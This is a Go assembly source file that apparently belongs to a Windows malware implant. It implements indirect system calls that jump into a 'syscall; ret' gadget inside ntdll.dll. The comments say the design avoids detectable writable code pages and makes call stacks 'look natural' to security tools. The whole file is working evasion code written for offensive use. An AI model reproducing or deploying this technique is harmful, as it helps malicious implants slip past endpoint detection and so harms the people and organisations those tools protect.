// SPDX-License-Identifier: MIT
// Adapted from github.com/f1zm0/acheron (MIT) — syscall_amd64.s.
// Original mixes runtime/sys_windows_amd64.s (Go authors, BSD-3) and
// C-Sto/BananaPhone (MIT) with a `jmp [trampoline]` tweak so the syscall
// instruction executes inside ntdll.dll instead of inside our own page —
// that's what makes this an *indirect* syscall.
//
// Why this exists alongside MethodIndirect (the byte-patched stub):
//   - no per-call VirtualProtect dance (RW→RX→RW)
//   - no writable code page in the implant's heap (RWX-adjacent — flagged)
//   - return address falls inside ntdll, callstack walks look natural
//
//go:build windows && amd64

#include "textflag.h"

#define maxargs 16

// func indirectSyscallAsm(ssn uint16, trampoline uintptr, args ...uintptr) uint32
//
// Frame size 44 = ssn(8 padded) + trampoline(8) + args slice header(24) +
// return uint32(4). Go vet computes this from the Go declaration; acheron's
// upstream uses 40 because it omits the return slot, which `go vet` rejects.
TEXT ·indirectSyscallAsm(SB),NOSPLIT, $0-44
    XORQ    AX, AX
    MOVW    ssn+0(FP), AX

    XORQ    R11, R11
    MOVQ    trampoline+8(FP), R11

    PUSHQ   CX

    // variadic slice header: ptr at +16, len at +24
    MOVQ    args_base+16(FP), SI
    MOVQ    args_len+24(FP),  CX

    // SetLastError(0).
    MOVQ    0x30(GS), DI
    MOVL    $0, 0x68(DI)

    // room for stack args
    SUBQ    $(maxargs*8), SP

    // No args: jump straight to syscall.
    CMPL    CX, $0
    JLE     jumpcall

    // Up to 4 args: load registers only, no stack copy.
    CMPL    CX, $4
    JLE     loadregs

    // More than maxargs: bail (debugger trap).
    CMPL    CX, $maxargs
    JLE     2(PC)
    INT     $3

    // Copy variadic args onto our stack frame.
    MOVQ    SP, DI
    CLD
    REP; MOVSQ
    MOVQ    SP, SI

loadregs:
    // First 4 args go into RCX/RDX/R8/R9 (and X0..X3 for FP fallback).
    MOVQ    0(SI),  CX
    MOVQ    8(SI),  DX
    MOVQ    16(SI), R8
    MOVQ    24(SI), R9
    MOVQ    CX, X0
    MOVQ    DX, X1
    MOVQ    R8, X2
    MOVQ    R9, X3

jumpcall:
    // Win64 NT syscall ABI: syscall number in EAX, 1st arg also in R10.
    MOVQ    CX, R10

    // Transfer to the syscall;ret gadget inside ntdll. The CALL pushes our
    // return address, the gadget executes `syscall` then `ret` straight back.
    CALL    R11

    ADDQ    $((maxargs)*8), SP
    POPQ    CX
    MOVL    AX, ret+40(FP)
    RET
